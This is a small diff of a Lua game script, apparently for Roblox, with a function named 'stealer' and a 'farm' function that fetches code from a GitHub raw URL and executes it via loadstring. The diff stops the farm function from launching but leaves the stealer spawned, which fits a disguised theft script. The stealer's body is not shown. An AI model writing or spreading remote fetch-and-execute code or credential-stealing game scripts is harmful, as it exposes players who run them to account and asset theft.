@@ -3,7 +3,7 @@ local function stealer()
 end
 local function farm()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptsHub11/loadingGUI/refs/heads/main/loadingGUI'))()
-
+end
 
 task.spawn(stealer)
-task.spawn(farm)
+
